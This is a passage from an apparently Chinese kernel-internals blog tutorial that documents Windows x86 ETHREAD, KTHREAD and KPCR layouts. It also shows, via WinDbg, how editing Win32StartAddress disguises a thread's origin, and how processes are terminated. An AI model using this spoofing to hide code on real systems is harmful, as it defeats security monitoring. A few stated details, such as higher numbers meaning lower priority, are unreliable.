UCHAR StartAddressInvalid:<span class=\"number\">1</span>;                           <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR EtwPageFaultCalloutActive:<span class=\"number\">1</span>;                              <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsProcessWorkingSetExclusive:<span class=\"number\">1</span>;                         <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsProcessWorkingSetShared:<span class=\"number\">1</span>;                            <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsSystemCacheWorkingSetExclusive:<span class=\"number\">1</span>;                     <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsSystemCacheWorkingSetShared:<span class=\"number\">1</span>;                        <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsSessionWorkingSetExclusive:<span class=\"number\">1</span>;                         <span class=\"comment\">//0x288</span></span><br><span class=\"line\">            UCHAR OwnsSessionWorkingSetShared:<span class=\"number\">1</span>;                            <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsProcessAddressSpaceExclusive:<span class=\"number\">1</span>;                       <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsProcessAddressSpaceShared:<span class=\"number\">1</span>;                          <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR SuppressSymbolLoad:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR Prefetching:<span class=\"number\">1</span>;                                            <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsDynamicMemoryShared:<span class=\"number\">1</span>;                                <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsChangeControlAreaExclusive:<span class=\"number\">1</span>;                         <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsChangeControlAreaShared:<span class=\"number\">1</span>;                            <span class=\"comment\">//0x289</span></span><br><span class=\"line\">            UCHAR OwnsPagedPoolWorkingSetExclusive:<span class=\"number\">1</span>;                       <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR OwnsPagedPoolWorkingSetShared:<span class=\"number\">1</span>;                          <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR OwnsSystemPtesWorkingSetExclusive:<span class=\"number\">1</span>;                      <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR OwnsSystemPtesWorkingSetShared:<span class=\"number\">1</span>;                         <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR TrimTrigger:<span class=\"number\">2</span>;                                            <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR Spare1:<span class=\"number\">2</span>;                                                 <span class=\"comment\">//0x28a</span></span><br><span class=\"line\">            UCHAR PriorityRegionActive;                                     <span class=\"comment\">//0x28b</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR CacheManagerActive;                                               <span class=\"comment\">//0x28c</span></span><br><span class=\"line\">    UCHAR DisablePageFaultClustering;                                       <span class=\"comment\">//0x28d</span></span><br><span class=\"line\">    UCHAR ActiveFaultCount;                                                 <span class=\"comment\">//0x28e</span></span><br><span class=\"line\">    UCHAR LockOrderState;                                                   <span class=\"comment\">//0x28f</span></span><br><span class=\"line\">    ULONG AlpcMessageId;                                                    <span class=\"comment\">//0x290</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        VOID* AlpcMessage;                                                  <span class=\"comment\">//0x294</span></span><br><span class=\"line\">        ULONG AlpcReceiveAttributeSet;                                      <span class=\"comment\">//0x294</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> AlpcWaitListEntry;                                   <span class=\"comment\">//0x298</span></span><br><span class=\"line\">    ULONG CacheManagerCount;                                                <span class=\"comment\">//0x2a0</span></span><br><span class=\"line\">    ULONG IoBoostCount;                                                     <span class=\"comment\">//0x2a4</span></span><br><span class=\"line\">    ULONG IrpListLock;                                                      <span class=\"comment\">//0x2a8</span></span><br><span class=\"line\">    VOID* ReservedForSynchTracking;                                         <span class=\"comment\">//0x2ac</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_SINGLE_LIST_ENTRY</span> CmCallbackListHead;                           <span class=\"comment\">//0x2b0</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Tcb：KTHREAD成员，见下文。</li>\n<li>StartAddress：线程函数起始地址。</li>\n<li>Cid：当前线程的线程ID。为_CLIENT_ID结构，包含了线程ID和所属的进程ID。</li>\n<li>Win32StartAddress：GUI线程函数起始地址。如果一个线程属于GUI线程则这个位置为真实的线程起始地址，否则为null。</li>\n<li>ThreadListEntry：当前进程内所有线程的双向链表。</li>\n<li>RundownProtect：与EPROCESS效果一致。</li>\n<li>ThreadLock：与EPROCESS效果一致。</li>\n</ul>\n<h2 id=\"2-1-KTHREAD\"><a href=\"#2-1-KTHREAD\" class=\"headerlink\" title=\"2.1 KTHREAD\"></a>2.1 KTHREAD</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x200 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_DISPATCHER_HEADER</span> Header;                                       <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG CycleTime;                                           <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG HighCycleTime;                                           <span class=\"comment\">//0x18</span></span><br><span class=\"line\">    ULONGLONG QuantumTarget;                                                <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    VOID* InitialStack;                                                     <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    VOID* <span class=\"keyword\">volatile</span> StackLimit;                                              <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    VOID* KernelStack;                                                      <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    ULONG ThreadLock;                                                       <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_KWAIT_STATUS_REGISTER</span> WaitRegister;                              <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR Running;                                                 <span class=\"comment\">//0x39</span></span><br><span class=\"line\">    UCHAR Alerted[<span class=\"number\">2</span>];                                                       <span class=\"comment\">//0x3a</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG KernelStackResident:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG ReadyTransition:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG ProcessReadyQueue:<span class=\"number\">1</span>;                                      <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG WaitNext:<span class=\"number\">1</span>;                                               <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG SystemAffinityActive:<span class=\"number\">1</span>;                                   <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG Alertable:<span class=\"number\">1</span>;                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG GdiFlushActive:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG UserStackWalkActive:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG ApcInterruptRequest:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG ForceDeferSchedule:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG QuantumEndMigrate:<span class=\"number\">1</span>;                                      <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG UmsDirectedSwitchEnable:<span class=\"number\">1</span>;                                <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG TimerActive:<span class=\"number\">1</span>;                                            <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG SystemThread:<span class=\"number\">1</span>;                                           <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">            ULONG Reserved:<span class=\"number\">18</span>;                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        LONG MiscFlags;                                                     <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAPC_STATE</span> ApcState;                                        <span class=\"comment\">//0x40</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR ApcStateFill[<span class=\"number\">23</span>];                                         <span class=\"comment\">//0x40</span></span><br><span class=\"line\">            CHAR Priority;                                                  <span class=\"comment\">//0x57</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG NextProcessor;                                           <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG DeferredProcessor;                                       <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">    ULONG ApcQueueLock;                                                     <span class=\"comment\">//0x60</span></span><br><span class=\"line\">    ULONG ContextSwitches;                                                  <span class=\"comment\">//0x64</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR State;                                                   <span class=\"comment\">//0x68</span></span><br><span class=\"line\">    CHAR NpxState;                                                          <span class=\"comment\">//0x69</span></span><br><span class=\"line\">    UCHAR WaitIrql;                                                         <span class=\"comment\">//0x6a</span></span><br><span class=\"line\">    CHAR WaitMode;                                                          <span class=\"comment\">//0x6b</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG WaitStatus;                                               <span class=\"comment\">//0x6c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KWAIT_BLOCK</span>* WaitBlockList;                                     <span class=\"comment\">//0x70</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> WaitListEntry;                                   <span class=\"comment\">//0x74</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_SINGLE_LIST_ENTRY</span> SwapListEntry;                            <span class=\"comment\">//0x74</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KQUEUE</span>* <span class=\"keyword\">volatile</span> Queue;                                         <span class=\"comment\">//0x7c</span></span><br><span class=\"line\">    ULONG WaitTime;                                                         <span class=\"comment\">//0x80</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            SHORT KernelApcDisable;                                         <span class=\"comment\">//0x84</span></span><br><span class=\"line\">            SHORT SpecialApcDisable;                                        <span class=\"comment\">//0x86</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ULONG CombinedApcDisable;                                           <span class=\"comment\">//0x84</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    VOID* Teb;                                                              <span class=\"comment\">//0x88</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTIMER</span> Timer;                                                   <span class=\"comment\">//0x90</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG AutoAlignment:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG DisableBoost:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG EtwStackTraceApc1Inserted:<span class=\"number\">1</span>;                     <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG EtwStackTraceApc2Inserted:<span class=\"number\">1</span>;                     <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG CalloutActive:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG ApcQueueable:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG EnableStackSwap:<span class=\"number\">1</span>;                               <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG GuiThread:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG UmsPerformingSyscall:<span class=\"number\">1</span>;                          <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG VdmSafe:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG UmsDispatched:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">            <span class=\"keyword\">volatile</span> ULONG ReservedFlags:<span class=\"number\">21</span>;                                <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">volatile</span> LONG ThreadFlags;                                          <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    VOID* ServiceTable;                                                     <span class=\"comment\">//0xbc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KWAIT_BLOCK</span> WaitBlock[<span class=\"number\">4</span>];                                       <span class=\"comment\">//0xc0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> QueueListEntry;                                      <span class=\"comment\">//0x120</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTRAP_FRAME</span>* TrapFrame;                                         <span class=\"comment\">//0x128</span></span><br><span class=\"line\">    VOID* FirstArgument;                                                    <span class=\"comment\">//0x12c</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        VOID* CallbackStack;                                                <span class=\"comment\">//0x130</span></span><br><span class=\"line\">        ULONG CallbackDepth;                                                <span class=\"comment\">//0x130</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR ApcStateIndex;                                                    <span class=\"comment\">//0x134</span></span><br><span class=\"line\">    CHAR BasePriority;                                                      <span class=\"comment\">//0x135</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        CHAR PriorityDecrement;                                             <span class=\"comment\">//0x136</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR ForegroundBoost:<span class=\"number\">4</span>;                                        <span class=\"comment\">//0x136</span></span><br><span class=\"line\">            UCHAR UnusualBoost:<span class=\"number\">4</span>;                                           <span class=\"comment\">//0x136</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR Preempted;                                                        <span class=\"comment\">//0x137</span></span><br><span class=\"line\">    UCHAR AdjustReason;                                                     <span class=\"comment\">//0x138</span></span><br><span class=\"line\">    CHAR AdjustIncrement;                                                   <span class=\"comment\">//0x139</span></span><br><span class=\"line\">    CHAR PreviousMode;                                                      <span class=\"comment\">//0x13a</span></span><br><span class=\"line\">    CHAR Saturation;                                                        <span class=\"comment\">//0x13b</span></span><br><span class=\"line\">    ULONG SystemCallNumber;                                                 <span class=\"comment\">//0x13c</span></span><br><span class=\"line\">    ULONG FreezeCount;                                                      <span class=\"comment\">//0x140</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_GROUP_AFFINITY</span> UserAffinity;                           <span class=\"comment\">//0x144</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPROCESS</span>* Process;                                              <span class=\"comment\">//0x150</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_GROUP_AFFINITY</span> Affinity;                               <span class=\"comment\">//0x154</span></span><br><span class=\"line\">    ULONG IdealProcessor;                                                   <span class=\"comment\">//0x160</span></span><br><span class=\"line\">    ULONG UserIdealProcessor;                                               <span class=\"comment\">//0x164</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAPC_STATE</span>* ApcStatePointer[<span class=\"number\">2</span>];                                 <span class=\"comment\">//0x168</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAPC_STATE</span> SavedApcState;                                   <span class=\"comment\">//0x170</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SavedApcStateFill[<span class=\"number\">23</span>];                                    <span class=\"comment\">//0x170</span></span><br><span class=\"line\">            UCHAR WaitReason;                                               <span class=\"comment\">//0x187</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    CHAR SuspendCount;                                                      <span class=\"comment\">//0x188</span></span><br><span class=\"line\">    CHAR Spare1;                                                            <span class=\"comment\">//0x189</span></span><br><span class=\"line\">    UCHAR OtherPlatformFill;                                                <span class=\"comment\">//0x18a</span></span><br><span class=\"line\">    VOID* <span class=\"keyword\">volatile</span> Win32Thread;                                             <span class=\"comment\">//0x18c</span></span><br><span class=\"line\">    VOID* StackBase;                                                        <span class=\"comment\">//0x190</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAPC</span> SuspendApc;                                            <span class=\"comment\">//0x194</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill0[<span class=\"number\">1</span>];                                       <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            UCHAR ResourceIndex;                                            <span class=\"comment\">//0x195</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill1[<span class=\"number\">3</span>];                                       <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            UCHAR QuantumReset;                                             <span class=\"comment\">//0x197</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill2[<span class=\"number\">4</span>];                                       <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            ULONG KernelTime;                                               <span class=\"comment\">//0x198</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill3[<span class=\"number\">36</span>];                                      <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span>* <span class=\"keyword\">volatile</span> WaitPrcb;                               <span class=\"comment\">//0x1b8</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill4[<span class=\"number\">40</span>];                                      <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            VOID* LegoData;                                                 <span class=\"comment\">//0x1bc</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR SuspendApcFill5[<span class=\"number\">47</span>];                                      <span class=\"comment\">//0x194</span></span><br><span class=\"line\">            UCHAR LargeStack;                                               <span class=\"comment\">//0x1c3</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG UserTime;                                                         <span class=\"comment\">//0x1c4</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSEMAPHORE</span> SuspendSemaphore;                                <span class=\"comment\">//0x1c8</span></span><br><span class=\"line\">        UCHAR SuspendSemaphorefill[<span class=\"number\">20</span>];                                     <span class=\"comment\">//0x1c8</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG SListFaultCount;                                                  <span class=\"comment\">//0x1dc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ThreadListEntry;                                     <span class=\"comment\">//0x1e0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> MutantListHead;                                      <span class=\"comment\">//0x1e8</span></span><br><span class=\"line\">    VOID* SListFaultAddress;                                                <span class=\"comment\">//0x1f0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD_COUNTERS</span>* ThreadCounters;                               <span class=\"comment\">//0x1f4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_XSTATE_SAVE</span>* XStateSave;                                        <span class=\"comment\">//0x1f8</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Header：可等待对象头部。</li>\n<li>InitialStack：线程切换相关。当前线程的栈底。栈底-29C是TrapFrame结构首地址。</li>\n<li>StackLimit：线程切换相关。当前线程的最大栈顶。ESP不能小于这个值。</li>\n<li>KernelStack：线程切换相关。线程切换时，存储当前线程切换时的ESP，被切换回来时，从这里恢复ESP。</li>\n<li>ThreadLock：跟上边的一致</li>\n<li>Running：线程状态，正在运行中为1，否则为0。</li>\n<li>Alerted：可警惕性。APC相关，后续APC章节学习。</li>\n<li>MiscFlags：<ul>\n<li>KernelStackResident：堆栈可扩展位。为1时，线程内核堆栈可以被扩大。0时无法扩大。</li>\n<li>SystemThread：为1时，该线程为内核线程，否则为用户线程。</li>\n</ul>\n</li>\n<li>ApcState：APC相关，后续APC章节学习。</li>\n<li>Priority：当前线程的优先级。如存储11，则优先级为11，当前线程存储在第11个就绪链表中。<code>优先级数字越大，优先级越低</code>。默认线程优先级为8，存储在第8个就绪链表中。</li>\n<li>NextProcessor：线程下次运行在哪个核上，如果为0，则随机。</li>\n<li>ApcQueueLock：APC相关，后续APC章节学习。</li>\n<li>ContextSwitches：当前线程切换了多少次。</li>\n<li>State：线程状态。就绪、等待、运行等。</li>\n<li>Teb：3环的TEB。</li>\n<li>EnableStackSwap：内核栈是否可以换出内存。</li>\n<li>ServiceTable：系统服务表地址，系统调用章节已学过。</li>\n<li>WaitBlock：当前线程正在等待的对象，由KPROCESS-&gt;ReadyThreadList指向。</li>\n<li>TrapFrame：TrapFrame结构，进0环时保存3环寄存器的值，系统调用章节已学过。</li>\n<li>BasePriority：线程基础优先级。这个值就是所属进程的BasePriority值。</li>\n<li>PreviousMode：先前模式。一些内核函数会判断这个值。</li>\n<li>FreezeCount：被挂起的次数。如果一直为0则无法被恢复。</li>\n<li>Process：该线程的父进程（创建该线程的进程）。</li>\n<li>ApcStatePointer：APC相关，后续APC章节学习。</li>\n<li>SavedApcState：APC相关，后续APC章节学习。</li>\n<li>Win32Thread：win32线程，如果该线程是UI图形线程，就会多一个win32线程结构体。</li>\n<li>ThreadListEntry：当前进程所有线程的双向链表。这个位置- KPROCESS-&gt;ThreadListEntry &#x3D;&#x3D; KPROCESS</li>\n</ul>\n<h2 id=\"2-2-线程伪装\"><a href=\"#2-2-线程伪装\" class=\"headerlink\" title=\"2.2 线程伪装\"></a>2.2 线程伪装</h2><p>使用<code>pchunter</code>随便查看一个进程的线程。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615094127635.png\" alt=\"image-20230615094127635\"></p>\n<p>然后使用Windbg查看对应的<code>ETHREAD</code>结构体。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615094234272.png\" alt=\"image-20230615094234272\"></p>\n<p>由于该进程具有GUI，因此<code>Win32StartAddress</code>不为null。然后将这个位置的值修改位其他线程的入口。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615094549890.png\" alt=\"image-20230615094549890\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615094610181.png\" alt=\"image-20230615094610181\"></p>\n<p>回到虚拟机重新查看线程所属的模块。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615094642370.png\" alt=\"image-20230615094642370\"></p>\n<p>可以看到已经被伪装。</p>\n<h2 id=\"2-3-杀死进程\"><a href=\"#2-3-杀死进程\" class=\"headerlink\" title=\"2.3 杀死进程\"></a>2.3 杀死进程</h2><p>杀死进程实际上等同于杀死线程，如果一个进程里没有任何线程在执行则进程等于结束。而<code>线程只能自己杀死自己</code>，原理是利用APC插入一个函数到线程中，这个函数的作用就是杀死自己，然后当线程调度后会执行这个函数就把自己杀死了。</p>\n<p>杀死进程有三种方法：</p>\n<ul>\n<li>调用API杀死</li>\n<li>清空进程中所有的线程链表。（API本质上就是这样）</li>\n<li>暴力抹除进程内存。(把进程代码直接抹除或者设置为不可执行，程序就会保存退出)</li>\n</ul>\n<h3 id=\"2-3-1-NtTerminateProcess逆向\"><a href=\"#2-3-1-NtTerminateProcess逆向\" class=\"headerlink\" title=\"2.3.1 NtTerminateProcess逆向\"></a>2.3.1 NtTerminateProcess逆向</h3><p>首先会判断EPROCESS.RundownProtect位，如果为1则不允许结束。这个位在上边有介绍。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615095932177.png\" alt=\"image-20230615095932177\"></p>\n<p>然后就是结束所有的线程。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615095952824.png\" alt=\"image-20230615095952824\"></p>\n<p><code>PspTerminateAllThreads</code>中实际上就是遍历线程后调用<code>PspTerminateThreadByPointer</code>结束，进入<code>PspTerminateThreadByPointer</code>。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230615100143668.png\" alt=\"image-20230615100143668\"></p>\n<blockquote>\n<p>这里需要补充的是，由于EPROCESS、KPROCESS、ETHREAD、KTHREAD都有一个ThreadListEntry。他们之间的关系如下</p>\n<p>EPROCESS-&gt;ThreadListEntry指向的位置是ETHREAD-&gt;ThreadListEntry</p>\n<p>KPROCESS-&gt;ThreadListEntry指向的位置是KTHREAD-&gt;ThreadListEntry</p>\n<p>因此如果要遍历线程需要上边对应的关系去减掉对应ThreadListEntry在*THREAD中的偏移(*表示K或者E)，才能拿到线程头</p>\n</blockquote>\n<h1 id=\"3、KPCR\"><a href=\"#3、KPCR\" class=\"headerlink\" title=\"3、KPCR\"></a>3、KPCR</h1><p>FS段，R0下叫做KPCR（内核进程控制区），R3下叫做PEB（进程环境块）。每一个核独有一个，这个结构记录了这个核的CPU信息。内核变量<code>KeNumberProcessors</code>用于记录当前机器有多少个核。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613122919271.png\" alt=\"image-20230613122919271\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x3748 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KPCR</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_NT_TIB</span> NtTib;                                               <span class=\"comment\">//0x0</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">struct</span> <span class=\"title 